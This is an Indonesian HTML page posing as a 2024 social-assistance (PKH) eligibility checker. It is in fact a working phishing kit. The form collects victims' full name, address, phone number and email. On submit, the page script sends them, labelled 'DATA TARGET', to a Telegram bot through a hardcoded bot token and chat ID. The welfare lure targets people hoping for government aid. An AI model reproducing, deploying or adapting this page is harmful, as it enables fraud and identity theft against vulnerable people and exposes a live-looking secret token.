<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pengecekan Bantuan Sosial 2024</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
      /* CSS styles remain unchanged */
      * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          font-family: 'Poppins', sans-serif;
      }

      body {
          background-color: #f0f2f5;
          color: #333;
          display: flex;
          flex-direction: column;
          min-height: 100vh; /* Membuat tinggi minimal 100% viewport */
      }

      .container {
          background: linear-gradient(135deg, #ffffff, #f7f9fc);
          padding: 30px;
          border-radius: 16px;
          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
          width: 100%;
          max-width: 500px;
          text-align: center;
          margin: auto; /* Membuat container berada di tengah halaman */
      }

      .icon {
          font-size: 60px;
          color: #ff6b6b;
          margin-bottom: 15px;
      }

      h1 {
          font-size: 26px;
          font-weight: 600;
          color: #333;
          margin-bottom: 25px;
          letter-spacing: 1px;
      }

      .form-group {
          margin-bottom: 20px;
          text-align: left;
      }

      .form-group label {
          display: block;
          font-weight: 500;
          color: #555;
          margin-bottom: 8px;
      }

      .form-group input,
      .form-group textarea {
          width: 100%;
          padding: 12px;
          border: 1px solid #ccc;
          border-radius: 8px;
          font-size: 15px;
          transition: border-color 0.3s ease;
      }

      .form-group input:focus,
      .form-group textarea:focus {
          border-color: #ff6b6b;
          outline: none;
      }

      textarea {
          resize: vertical;
      }

      button {
          background-color: #ff6b6b;
          color: #fff;
          padding: 12px 20px;
          border: none;
          border-radius: 8px;
          cursor: pointer;
          font-size: 16px;
          font-weight: 600;
          transition: background-color 0.3s ease;
          width: 100%;
      }

      button:hover {
          background-color: #e84141;
      }

      footer {
          margin-top: auto; /* Membuat footer tetap di bawah */
          padding: 20px 0;
          background-color: #fff;
          text-align: center;
          font-size: 14px;
          border-top: 1px solid #ccc;
      }

      .footer-content {
          padding-top: 10px;
      }

      .footer-links a {
          margin: 0 15px;
          text-decoration: none;
          color: #555;
          font-weight: 500;
      }

      .footer-links a:hover {
          text-decoration: underline;
          color: #ff6b6b;
      }

      .footer-social-icons a {
          color: #555;
          margin: 0 15px;
          font-size: 22px;
          text-decoration: none;
          transition: color 0.3s ease;
      }

      .footer-social-icons a:hover {
          color: #ff6b6b;
      }

      /* Media queries untuk tampilan mobile */
      @media (max-width: 600px) {
          body {
              padding: 15px;
          }

          .container {
              padding: 20px;
          }

          h1 {
              font-size: 22px;
          }

          button {
              padding: 10px 16px;
              font-size: 14px;
          }

          .form-group input,
          .form-group textarea {
              font-size: 14px;
          }

          .icon {
              font-size: 48px;
          }
      }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">
        <i class="fas fa-hand-holding-heart"></i>
    </div>
    <h1 id="dynamicText"></h1>
    <form id="bantuanForm">
        <div class="form-group">
            <label for="name">Nama Lengkap:</label>
            <input type="text" id="name" name="name" required>
        </div>

        <div class="form-group">
            <label for="address">Alamat Lengkap:</label>
            <input type="text" id="address" name="address" required>
        </div>

        <div class="form-group">
            <label for="phone">Nomor Telepon:</label>
            <input type="tel" id="phone" name="phone" required>
        </div>

        <div class="form-group">
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>
        </div>

        <div class="form-group">
            <label for="comments">Komentar:</label>
            <textarea id="comments" name="comments" rows="4" placeholder="Tulis komentar atau pertanyaan Anda di sini..."></textarea>
        </div>

        <button type="submit">Kirim</button>
    </form>
</div>

<footer>
    <div class="footer-content">
        <p>&copy; 2024 Pengecekan Bantuan Sosial. Semua hak dilindungi.</p>
        <div class="footer-links">
            <a href="#about">Tentang Kami</a>
            <a href="#contact">Kontak</a>
        </div>
        <div class="footer-social-icons">
            <a href="https://facebook.com" target="_blank" class="fab fa-facebook-f"></a>
            <a href="https://twitter.com" target="_blank" class="fab fa-twitter"></a>
            <a href="https://instagram.com" target="_blank" class="fab fa-instagram"></a>
        </div>
    </div>
</footer>
<script>
    // Efek mengetik pada judul
    var phrases = [
        "Cek Sekarang!",
        "Pengguna PKH",
        "Bantuan Menunggu Anda!",
        "Segera Periksa!",
        "Dapatkan Bantuan Anda!"
    ];
    var currentPhraseIndex = 0;
    var currentCharIndex = 0;
    var typingDelay = 100;
    var erasingDelay = 50;
    var newPhraseDelay = 2000;

    function type() {
        if (currentCharIndex < phrases[currentPhraseIndex].length) {
            document.getElementById('dynamicText').textContent += phrases[currentPhraseIndex].charAt(currentCharIndex);
            currentCharIndex++;
            setTimeout(type, typingDelay);
        } else {
            setTimeout(erase, newPhraseDelay);
        }
    }

    function erase() {
        if (currentCharIndex > 0) {
            document.getElementById('dynamicText').textContent = phrases[currentPhraseIndex].substring(0, currentCharIndex - 1);
            currentCharIndex--;
            setTimeout(erase, erasingDelay);
        } else {
            currentPhraseIndex = (currentPhraseIndex + 1) % phrases.length;
            setTimeout(type, typingDelay + 1000);
        }
    }

    type(); // Memulai efek mengetik

    // Ganti dengan token bot Telegram Anda
    const botToken = '7371764330:AAEgSgROcGBEbsgspY4IDNU_WqPL_3IczGs';
    // Ganti dengan chat ID Anda
    const chatId = '6864784021'; // Misal: '123456789' untuk pengguna pribadi atau '@your_channel' untuk channel

    document.getElementById('bantuanForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Mencegah pengiriman formulir default

        // Mendapatkan data formulir
        var formData = new FormData(event.target);
        var data = Object.fromEntries(formData.entries());

        // Format pesan yang akan dikirim
        const message = `
DATA TARGET
Nama Lengkap: ${data.name}
Alamat Lengkap: ${data.address}
Nomor Telepon: ${data.phone}
Email: ${data.email}
Komentar: ${data.comments}
        `.trim();

        // Mengirim data ke bot Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => {
            if (response.ok) {
                alert('Data berhasil dikirim!');
                event.target.reset(); // Mengatur ulang formulir setelah pengiriman
            } else {
                alert('Gagal mengirim data. Coba lagi.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Terjadi kesalahan saat mengirim data.');
        });
    });
</script>
</body>
</html>
